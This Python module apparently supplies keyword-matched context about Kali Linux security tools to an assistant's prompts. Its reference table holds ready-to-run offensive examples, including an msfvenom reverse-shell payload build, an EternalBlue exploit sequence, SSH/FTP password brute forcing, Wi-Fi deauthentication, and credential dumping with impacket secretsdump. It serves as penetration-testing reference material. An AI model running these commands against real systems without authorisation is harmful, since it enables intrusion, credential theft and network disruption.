#!/usr/bin/env python3
# PAW Context Library
# Provides context for user prompts based on keywords

import re
from typing import Optional, Dict, List, Any

# Import prompts
try:
    from prompts_lib import AIRCRACK_PROMPTS, NETWORK_PROMPTS
except ImportError:
    # Fallback defaults if prompts_lib isn't available
    AIRCRACK_PROMPTS = {
        "general": "The aircrack-ng suite is a set of tools for auditing wireless security."
    }
    NETWORK_PROMPTS = {
        "general": "Network tools help with discovery and analysis of networks."
    }

# Kali Linux tools information
KALI_TOOLS = {
    # Wireless tools
    "aircrack-ng": {
        "description": "Complete suite for auditing wireless networks. Used for cracking WEP and WPA-PSK keys.",
        "commands": ["aircrack-ng", "airdecap-ng", "airdecloak-ng", "airmon-ng", "airodump-ng", "aireplay-ng", "airbase-ng", "airolib-ng", "airserv-ng", "airtun-ng"],
        "main_options": "-b (BSSID), -a (attack mode), -w (wordlist), -e (ESSID)",
        "examples": ["aircrack-ng -w wordlist.txt capture.cap", "aircrack-ng -b 00:11:22:33:44:55 -w wordlist.txt capture.cap"]
    },
    "airmon-ng": {
        "description": "Script for placing wireless adapters into monitor mode",
        "main_options": "check, check kill, start, stop",
        "examples": ["airmon-ng", "airmon-ng check kill", "airmon-ng start wlan0", "airmon-ng stop wlan0mon"]
    },
    "airodump-ng": {
        "description": "Wireless packet capture tool, used for capturing 802.11 frames for later use with aircrack-ng",
        "main_options": "--bssid (target AP), -c (channel), -w (write to file), --essid (target network)",
        "examples": ["airodump-ng wlan0mon", "airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon"]
    },
    "aireplay-ng": {
        "description": "Tool for wireless packet injection, used to generate traffic for later use with aircrack-ng",
        "main_options": "-0 (deauth), -1 (fake auth), -2 (interactive replay), -3 (ARP replay)",
        "examples": ["aireplay-ng -0 10 -a [AP MAC] -c [CLIENT MAC] wlan0mon", "aireplay-ng -1 0 -e [ESSID] -a [AP MAC] wlan0mon"]
    },
    "wifite": {
        "description": "Automated wireless attack tool designed to simplify wireless auditing",
        "main_options": "-wep (attack WEP), -wpa (attack WPA), -i (interface)",
        "examples": ["wifite", "wifite -i wlan0mon", "wifite --crack -i wlan0mon"]
    },
    "reaver": {
        "description": "Tool for brute force attacks against WPS (Wi-Fi Protected Setup)",
        "main_options": "-i (interface), -b (BSSID), -c (channel), -vv (verbose)",
        "examples": ["reaver -i wlan0mon -b 00:11:22:33:44:55 -vv", "reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv"]
    },
    "bully": {
        "description": "WPS brute force attack tool, alternative to reaver",
        "main_options": "-b (BSSID), -c (channel), -l (lockout wait)",
        "examples": ["bully -b 00:11:22:33:44:55 -c 6 wlan0mon"]
    },
    "fern-wifi-cracker": {
        "description": "GUI-based wireless security auditing tool",
        "examples": ["fern-wifi-cracker"]
    },
    "kismet": {
        "description": "Wireless network detector, sniffer, and IDS",
        "examples": ["kismet -c wlan0mon"]
    },
    
    # Network scanning and enumeration
    "nmap": {
        "description": "Network exploration and security auditing tool",
        "main_options": "-sS (SYN scan), -sV (version detection), -O (OS detection), -p (ports), -A (aggressive), -T(1-5) (timing)",
        "examples": ["nmap 192.168.1.1", "nmap -sS -sV -p 1-1000 192.168.1.0/24", "nmap -A -T4 scanme.nmap.org"]
    },
    "masscan": {
        "description": "Fast TCP port scanner, spins up multiple TCP SYN packets in a very short time",
        "main_options": "-p (ports), --rate (packets per second)",
        "examples": ["masscan -p 80,443 192.168.1.0/24", "masscan -p 1-65535 --rate 10000 192.168.1.0/24"]
    },
    "netdiscover": {
        "description": "Active/passive ARP reconnaissance tool to discover hosts on local network",
        "main_options": "-r (range), -i (interface), -p (passive mode)",
        "examples": ["netdiscover -r 192.168.1.0/24", "netdiscover -i eth0 -r 192.168.1.0/24"]
    },
    "hping3": {
        "description": "Command-line oriented TCP/IP packet assembler/analyzer",
        "main_options": "-S (SYN), -A (ACK), -F (FIN), -p (port)",
        "examples": ["hping3 -S -p 80 -c 5 target.com", "hping3 --scan 1-100 -S target.com"]
    },
    "dnsenum": {
        "description": "Tool to enumerate DNS information about domains and to discover non-contiguous IP blocks",
        "main_options": "-d (domain), -f (wordlist)",
        "examples": ["dnsenum domain.com", "dnsenum --threads 50 -f wordlist.txt domain.com"]
    },
    "fierce": {
        "description": "DNS reconnaissance tool for locating non-contiguous IP space",
        "main_options": "-dns (domain)",
        "examples": ["fierce -dns domain.com"]
    },
    
    # Vulnerability scanning and exploitation
    "metasploit": {
        "description": "Penetration testing framework with exploit database, used for developing and executing exploits",
        "commands": ["msfconsole", "msfvenom", "msfdb"],
        "examples": ["msfconsole", "msfdb init", "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe"]
    },
    "msfconsole": {
        "description": "Main interface to the Metasploit Framework",
        "main_commands": "search, use, set, show options, exploit/run, sessions",
        "examples": ["msfconsole", "search type:exploit platform:windows name:smb", "use exploit/windows/smb/ms17_010_eternalblue", "set RHOSTS 192.168.1.10", "exploit"]
    },
    "msfvenom": {
        "description": "Payload generator and encoder for the Metasploit Framework",
        "main_options": "-p (payload), LHOST, LPORT, -f (format), -o (output)",
        "examples": ["msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe"]
    },
    "sqlmap": {
        "description": "Automated SQL injection and database takeover tool",
        "main_options": "-u (URL), --data (POST data), --dbs (databases), --tables, --dump",
        "examples": ["sqlmap -u 'http://example.com/page.php?id=1'", "sqlmap -u 'http://example.com/login.php' --data 'username=test&password=test' --dbs"]
    },
    "nikto": {
        "description": "Web server scanner that tests for dangerous files/CGIs, outdated server software and other issues",
        "main_options": "-h (host), -p (port), -ssl (use SSL)",
        "examples": ["nikto -h example.com", "nikto -h example.com -p 443 -ssl"]
    },
    "gobuster": {
        "description": "Directory/file and DNS busting tool written in Go",
        "main_options": "dir -u (URL) -w (wordlist), dns -d (domain) -w (wordlist)",
        "examples": ["gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt", "gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt"]
    },
    "dirb": {
        "description": "Web content scanner that looks for hidden web objects using a dictionary",
        "main_options": "(URL) (wordlist), -o (output), -r (non-recursive)",
        "examples": ["dirb http://example.com", "dirb http://example.com /usr/share/wordlists/dirb/common.txt"]
    },
    "dirbuster": {
        "description": "GUI-based application designed to brute force directories and files on web servers",
        "examples": ["dirbuster"]
    },
    
    # Password attacking
    "hydra": {
        "description": "Fast and flexible online password cracking tool that supports numerous protocols",
        "main_options": "-l (username), -L (username list), -p (password), -P (password list), -t (threads)",
        "examples": ["hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10", "hydra -L users.txt -P pass.txt ftp://192.168.1.10"]
    },
    "john": {
        "description": "Active password cracking tool, designed to detect weak Unix passwords",
        "main_options": "--wordlist (wordlist), --format (hash type), --rules (rule set)",
        "examples": ["john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt", "john --format=raw-md5 hashes.txt"]
    },
    "hashcat": {
        "description": "Advanced password recovery utility with support for many hash types",
        "main_options": "-m (hash type), -a (attack mode), -o (output file)",
        "examples": ["hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt", "hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a"]
    },
    "crunch": {
        "description": "Tool for creating wordlists with specific patterns",
        "main_options": "(min length) (max length) (character set)",
        "examples": ["crunch 8 8 0123456789ABCDEF -o wordlist.txt", "crunch 4 6 abc123"]
    },
    "medusa": {
        "description": "High-speed, parallel network login auditor",
        "main_options": "-h (host), -u (user), -p (password), -P (password list), -M (module)",
        "examples": ["medusa -h 192.168.1.10 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh"]
    },
    
    # Sniffing and spoofing
    "wireshark": {
        "description": "Network protocol analyzer with a GUI, used for deep inspection of hundreds of protocols",
        "examples": ["wireshark"]
    },
    "tshark": {
        "description": "Command-line version of Wireshark, for capturing and displaying packets",
        "main_options": "-i (interface), -w (write to file), -r (read from file)",
        "examples": ["tshark -i eth0", "tshark -r capture.pcap -Y 'http'"]
    },
    "tcpdump": {
        "description": "Command-line packet analyzer",
        "main_options": "-i (interface), -w (write to file), -r (read from file)",
        "examples": ["tcpdump -i eth0", "tcpdump -i eth0 -w capture.pcap", "tcpdump -r capture.pcap 'port 80'"]
    },
    "ettercap": {
        "description": "Comprehensive suite for MITM attacks, featuring sniffing, content filtering and more",
        "main_options": "-T (text mode), -G (GUI mode), -M (MITM method)",
        "examples": ["ettercap -G", "ettercap -T -q -M arp:remote /192.168.1.1/ /192.168.1.10-20/"]
    },
    "bettercap": {
        "description": "Swiss army knife for network attacks and monitoring",
        "main_options": "-iface (interface), -eval (commands to execute)",
        "examples": ["bettercap -iface eth0", "bettercap -iface eth0 -eval 'net.probe on'"]
    },
    "responder": {
        "description": "LLMNR, NBT-NS and MDNS poisoner",
        "main_options": "-I (interface), -A (analyze mode), -w (start web server)",
        "examples": ["responder -I eth0", "responder -I eth0 -w -r -f"]
    },
    "macchanger": {
        "description": "Utility for manipulating MAC addresses",
        "main_options": "-r (random MAC), -a (same vendor), -m (specific MAC)",
        "examples": ["macchanger -r eth0", "macchanger -m 00:11:22:33:44:55 eth0", "macchanger -p eth0 (reset to original)"]
    },
    
    # Web application testing
    "burpsuite": {
        "description": "Integrated platform for web application security testing",
        "examples": ["burpsuite"]
    },
    "owasp-zap": {
        "description": "Integrated tool for finding vulnerabilities in web applications",
        "examples": ["owasp-zap"]
    },
    "wpscan": {
        "description": "WordPress security scanner",
        "main_options": "--url (target URL), --enumerate (enumeration mode)",
        "examples": ["wpscan --url http://wordpress.example.com", "wpscan --url http://wordpress.example.com --enumerate u"]
    },
    "ffuf": {
        "description": "Fast web fuzzer written in Go",
        "main_options": "-u (URL with FUZZ keyword), -w (wordlist)",
        "examples": ["ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt"]
    },
    
    # Post-exploitation
    "impacket": {
        "description": "Collection of Python classes for working with network protocols",
        "commands": ["impacket-secretsdump", "impacket-smbclient", "impacket-wmiexec", "impacket-psexec"],
        "examples": ["impacket-secretsdump domain/user:password@192.168.1.10", "impacket-psexec domain/user:password@192.168.1.10"]
    },
    "powershell-empire": {
        "description": "Post-exploitation framework with a focus on Windows targets",
        "examples": ["powershell-empire"]
    },
    "mimikatz": {
        "description": "Tool to extract plaintexts passwords, hashes, and Kerberos tickets from memory",
        "examples": ["mimikatz"]
    },
    
    # Forensics
    "autopsy": {
        "description": "Digital forensics platform for disk image analysis",
        "examples": ["autopsy"]
    },
    "foremost": {
        "description": "Data carving tool that recovers files based on their headers and footers",
        "main_options": "-t (file types), -i (input file), -o (output directory)",
        "examples": ["foremost -i disk.img -o recovered", "foremost -t jpg,pdf,doc -i disk.img"]
    },
    "binwalk": {
        "description": "Tool for searching binary files for embedded files and executable code",
        "main_options": "-e (extract), -B (binary greppable output), -M (magic scan)",
        "examples": ["binwalk firmware.bin", "binwalk -e firmware.bin"]
    },
    "volatility": {
        "description": "Memory forensics framework",
        "main_options": "-f (memory image), --profile (OS profile), [plugin]",
        "examples": ["vol.py -f memory.dmp imageinfo", "vol.py -f memory.dmp --profile=Win10x64 pslist"]
    },
    
    # Information gathering
    "theharvester": {
        "description": "Tool for gathering emails, subdomains, hosts, employee names, open ports from public sources",
        "main_options": "-d (domain), -l (limit results), -b (data source)",
        "examples": ["theharvester -d example.com -b all", "theharvester -d example.com -b google,bing,linkedin"]
    },
    "recon-ng": {
        "description": "Full-featured web reconnaissance framework",
        "examples": ["recon-ng"]
    },
    "maltego": {
        "description": "Interactive data mining tool for relationship mapping",
        "examples": ["maltego"]
    },
    "osint-framework": {
        "description": "Collection of OSINT (Open Source Intelligence) tools",
        "examples": ["Open source tools for various OSINT activities"]
    },
    
    # Steganography
    "steghide": {
        "description": "Tool that hides data in various kinds of image and audio files",
        "main_options": "embed -ef (file to hide) -cf (cover file), extract -sf (stego file)",
        "examples": ["steghide embed -ef secret.txt -cf image.jpg", "steghide extract -sf image.jpg"]
    },
    "stegosuite": {
        "description": "Steganography tool with GUI for hiding data in image files",
        "examples": ["stegosuite"]
    },
    
    # Reporting
    "dradis": {
        "description": "Collaborative reporting platform for IT security assessments",
        "examples": ["dradis"]
    },
    "faraday": {
        "description": "Collaborative penetration test and vulnerability management platform",
        "examples": ["faraday"]
    }
}

def get_context_for_prompt(prompt: str, previous_output: Optional[str] = None) -> Optional[str]:
    """
    Get contextual information based on keyword matching from user prompt
    
    Args:
        prompt: The user's input prompt
        previous_output: Optional output from previous command
        
    Returns:
        Context information as a formatted string, or None if no context found
    """
    prompt = prompt.lower()
    
    # First check for exact tool mentions in Kali tools
    for tool_name, tool_info in KALI_TOOLS.items():
        if tool_name.lower() in prompt:
            return format_kali_tool_info(tool_name, tool_info)
    
    # Check for specific aircrack tools first (direct mentions)
    if "airmon-ng" in prompt and "airmon-ng" in AIRCRACK_PROMPTS:
        return format_tool_info("airmon-ng", AIRCRACK_PROMPTS["airmon-ng"])
    
    if "airodump-ng" in prompt and "airodump-ng" in AIRCRACK_PROMPTS:
        return format_tool_info("airodump-ng", AIRCRACK_PROMPTS["airodump-ng"])
    
    if "aireplay-ng" in prompt and "aireplay-ng" in AIRCRACK_PROMPTS:
        return format_tool_info("aireplay-ng", AIRCRACK_PROMPTS["aireplay-ng"])
    
    if "aircrack-ng" in prompt and "aircrack-ng" in AIRCRACK_PROMPTS:
        return format_tool_info("aircrack-ng", AIRCRACK_PROMPTS["aircrack-ng"])
    
    # Check for tool types/categories
    tool_categories = {
        "wireless": ["aircrack-ng", "airmon-ng", "airodump-ng", "aireplay-ng", "wifite", "reaver", "bully", "fern-wifi-cracker"],
        "scanner": ["nmap", "masscan", "nikto", "wpscan", "sqlmap", "gobuster", "dirb"],
        "password": ["hydra", "john", "hashcat", "crunch", "medusa"],
        "exploit": ["metasploit", "msfconsole", "msfvenom"],
        "packet": ["wireshark", "tshark", "tcpdump", "ettercap", "bettercap"],
        "forensic": ["autopsy", "foremost", "binwalk", "volatility"],
    }
    
    for category, tools in tool_categories.items():
        if category in prompt:
            context = f"Tools for {category} in Kali Linux include: {', '.join(tools)}"
            for tool in tools:
                if tool in KALI_TOOLS:
                    context += f"\n\n{format_kali_tool_info(tool, KALI_TOOLS[tool])}"
                    # Just return info about the first matching tool to avoid overwhelming
                    return context
            return context
    
    # Check for keyword matches and return the appropriate context
    keywords_to_check = [
        # Aircrack related
        ("monitor mode", AIRCRACK_PROMPTS.get("airmon-ng")),
        ("monitor", AIRCRACK_PROMPTS.get("airmon-ng")),
        ("packet capture", AIRCRACK_PROMPTS.get("airodump-ng")),
        ("capture", AIRCRACK_PROMPTS.get("airodump-ng")),
        ("deauth", AIRCRACK_PROMPTS.get("aireplay-ng")),
        ("crack", AIRCRACK_PROMPTS.get("aircrack-ng")),
        ("wpa", AIRCRACK_PROMPTS.get("aircrack-ng")),
        
        # Network related
        ("scan", NETWORK_PROMPTS.get("scanning")),
        ("network", NETWORK_PROMPTS.get("scanning")),
        ("packet", NETWORK_PROMPTS.get("packet_capture")),
        ("wifi", NETWORK_PROMPTS.get("wifi")),
        ("wireless", NETWORK_PROMPTS.get("wifi"))
    ]
    
    for keyword, context_info in keywords_to_check:
        if keyword in prompt and context_info:
            return format_tool_info(keyword, context_info)
    
    # If no specific matches, return general info about aircrack
    if any(word in prompt for word in ["aircrack", "wireless", "wifi", "wlan", "monitor"]):
        return AIRCRACK_PROMPTS.get("general")
    
    # If no specific matches, return general info about networking
    if any(word in prompt for word in ["network", "scan", "capture", "packet"]):
        return NETWORK_PROMPTS.get("general")
    
    # No relevant context found
    return None

def format_tool_info(name: str, info: Dict[str, Any]) -> str:
    """
    Format the tool information into a readable string
    
    Args:
        name: Name or keyword for the tool
        info: Dictionary containing tool information
        
    Returns:
        Formatted string with tool information
    """
    result = []
    
    if "description" in info:
        result.append(f"{name.upper()}: {info['description']}")
    
    if "usage" in info:
        result.append(f"\nUsage: {info['usage']}")
    
    if "examples" in info and isinstance(info["examples"], list):
        result.append("\nExamples:")
        for example in info["examples"]:
            result.append(f"  {example}")
    
    if "common_tools" in info and isinstance(info["common_tools"], list):
        result.append(f"\nCommon tools: {', '.join(info['common_tools'])}")
    
    return "\n".join(result)

def format_kali_tool_info(name: str, info: Dict[str, Any]) -> str:
    """
    Format Kali tool information into a readable string
    
    Args:
        name: Tool name
        info: Dictionary containing tool information
        
    Returns:
        Formatted string with tool information
    """
    result = [f"{name.upper()}"]
    
    if "description" in info:
        result.append(f"Description: {info['description']}")
    
    if "commands" in info:
        result.append(f"Related commands: {', '.join(info['commands'])}")
    
    if "main_options" in info:
        result.append(f"Main options: {info['main_options']}")
        
    if "main_commands" in info:
        result.append(f"Main commands: {info['main_commands']}")
    
    if "examples" in info and isinstance(info["examples"], list):
        result.append("Examples:")
        for example in info["examples"]:
            result.append(f"  {example}")
    
    return "\n".join(result)

if __name__ == "__main__":
    # Test the context extraction
    test_prompts = [
        "How do I enable monitor mode?",
        "How can I capture packets with airodump-ng?",
        "I want to crack a WPA password",
        "Tell me about network scanning with nmap",
        "What is the aircrack-ng suite?",
        "How do I use hashcat to crack passwords?",
        "What can I do with Metasploit?",
        "Tell me about wireless tools in Kali"
    ]
    
    for prompt in test_prompts:
        print(f"Prompt: {prompt}")
        context = get_context_for_prompt(prompt)
        if context:
            print("Context:")
            print(context)
        else:
            print("No context found")
        print("---") 